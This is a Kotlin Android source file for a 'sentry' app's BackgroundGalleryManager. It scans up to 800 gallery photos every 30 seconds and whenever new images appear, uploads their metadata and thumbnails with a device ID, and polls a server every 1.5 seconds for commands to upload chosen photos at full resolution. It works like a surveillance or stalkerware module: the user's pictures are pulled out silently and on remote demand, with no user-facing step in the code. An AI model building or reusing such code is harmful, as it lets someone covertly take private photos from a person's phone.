package com.example.sentry.service

import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*

object BackgroundGalleryManager {
    private const val TAG = "BackgroundGalleryManager"
    private var syncJob: Job? = null
    private var commandPollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var observerRegistered = false

    fun startListening(context: Context) {
        if (!observerRegistered) {
            try {
                val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean, uri: Uri?) {
                        super.onChange(selfChange, uri)
                        scope.launch {
                            delay(1000) // Debounce rapid writes
                            val client = SentryApiClient(context)
                            syncGallery(context, client)
                        }
                    }
                }
                context.contentResolver.registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    observer
                )
                observerRegistered = true
                Log.d(TAG, "Gallery ContentObserver registered for real-time mobile gallery sync")
            } catch (e: Exception) {
                Log.w(TAG, "Could not register MediaStore observer: ${e.message}")
            }
        }

        // Periodic Gallery Sync
        if (syncJob?.isActive != true) {
            syncJob = scope.launch {
                val client = SentryApiClient(context)
                while (isActive) {
                    try {
                        syncGallery(context, client)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
                    }
                    delay(30_000) // Periodic refresh every 30 seconds
                }
            }
        }

        // Command Poller for On-Demand Full-Resolution Image Fetching
        if (commandPollerJob?.isActive != true) {
            commandPollerJob = scope.launch {
                val client = SentryApiClient(context)
                while (isActive) {
                    try {
                        val res = client.pollGalleryCommands()
                        if (res.isSuccess) {
                            val obj = res.getOrNull()
                            val fullImageMediaId = obj?.optString("fullImageMediaId")?.takeIf { it.isNotBlank() && it != "null" }
                            if (!fullImageMediaId.isNullOrBlank()) {
                                handleFullImageUpload(context, client, fullImageMediaId)
                            }
                        }
                    } catch (_: Exception) {
                    }
                    delay(1500)
                }
            }
        }
    }

    private suspend fun handleFullImageUpload(context: Context, client: SentryApiClient, mediaIdStr: String) {
        withContext(Dispatchers.IO) {
            try {
                val cleanId = mediaIdStr.removePrefix("media_").toLongOrNull() ?: return@withContext
                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cleanId)

                val fullBase64 = extractFullResolutionBase64(context, contentUri)
                if (!fullBase64.isNullOrBlank()) {
                    client.uploadFullGalleryImage(mediaIdStr, fullBase64, "image/jpeg")
                    Log.d(TAG, "Uploaded crystal-clear full-resolution photo for $mediaIdStr")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed full image upload for $mediaIdStr: ${e.message}")
            }
        }
    }

    suspend fun syncGallery(context: Context, client: SentryApiClient) {
        val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }

        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        if (!hasPermission) {
            Log.w(TAG, "READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE not granted")
            return
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.BUCKET_DISPLAY_NAME else MediaStore.Images.Media._ID
        )

        val cursor: Cursor? = try {
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to query MediaStore: ${e.message}")
            null
        }

        val allItems = mutableListOf<JSONObject>()

        cursor?.use { c ->
            val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
            val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            val dateIdx = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
            val sizeIdx = c.getColumnIndex(MediaStore.Images.Media.SIZE)
            val mimeIdx = c.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
            val widthIdx = c.getColumnIndex(MediaStore.Images.Media.WIDTH)
            val heightIdx = c.getColumnIndex(MediaStore.Images.Media.HEIGHT)
            val bucketIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
            } else -1

            val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())

            var count = 0
            val maxPhotosToScan = 800

            while (c.moveToNext() && count < maxPhotosToScan) {
                val mediaId = if (idIdx >= 0) c.getLong(idIdx) else 0L
                val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
                val dateAddedSec = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis() / 1000
                val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
                val mimeType = if (mimeIdx >= 0) c.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
                val width = if (widthIdx >= 0) c.getInt(widthIdx) else 1080
                val height = if (heightIdx >= 0) c.getInt(heightIdx) else 1920
                val albumName = if (bucketIdx >= 0) c.getString(bucketIdx) ?: "Camera" else "Camera"

                val sizeFormatted = when {
                    sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", sizeBytes / (1024.0 * 1024.0))
                    sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", sizeBytes / 1024)
                    else -> "$sizeBytes B"
                }

                val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)

                // Fast compressed thumbnail for grid cards
                val thumbnailBase64 = extractThumbnailBase64(context, contentUri)

                val obj = JSONObject().apply {
                    put("id", "media_$mediaId")
                    put("name", name)
                    put("album", albumName)
                    put("mimeType", mimeType)
                    put("size", sizeFormatted)
                    put("date", dateFormatted)
                    put("timestamp", dateAddedSec * 1000)
                    put("width", width)
                    put("height", height)
                    if (!thumbnailBase64.isNullOrBlank()) {
                        put("thumbnail", thumbnailBase64)
                    }
                }
                allItems.add(obj)
                count++
            }
        }

        // Send photos in batches of 40
        if (allItems.isNotEmpty()) {
            val batchSize = 40
            for (i in 0 until allItems.size step batchSize) {
                val chunk = allItems.subList(i, (i + batchSize).coerceAtMost(allItems.size))
                val batchArray = JSONArray()
                for (item in chunk) {
                    batchArray.put(item)
                }
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("media", batchArray)
                }
                client.syncGalleryMedia(body)
            }
            Log.d(TAG, "Synced ${allItems.size} mobile gallery photos in batches for $deviceId")
        }
    }

    private fun extractThumbnailBase64(context: Context, uri: Uri): String? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(uri, Size(220, 220), null)
            } else {
                context.contentResolver.openInputStream(uri)?.use { stream ->
                    val options = BitmapFactory.Options().apply { inSampleSize = 4 }
                    BitmapFactory.decodeStream(stream, null, options)
                }
            } ?: return null

            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }

    private fun extractFullResolutionBase64(context: Context, uri: Uri): String? {
        return try {
            // First decode bounds
            val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            context.contentResolver.openInputStream(uri)?.use { stream ->
                BitmapFactory.decodeStream(stream, null, options)
            }

            val maxDim = 2560 // 2.5K crisp high-definition resolution
            var sampleSize = 1
            if (options.outWidth > maxDim || options.outHeight > maxDim) {
                val larger = maxOf(options.outWidth, options.outHeight)
                sampleSize = larger / maxDim
            }

            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = sampleSize.coerceAtLeast(1)
                inPreferredConfig = Bitmap.Config.ARGB_8888
            }

            val fullBitmap = context.contentResolver.openInputStream(uri)?.use { stream ->
                BitmapFactory.decodeStream(stream, null, decodeOptions)
            } ?: return null

            val out = ByteArrayOutputStream()
            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 88, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Error decoding full resolution bitmap: ${e.message}")
            null
        }
    }
}
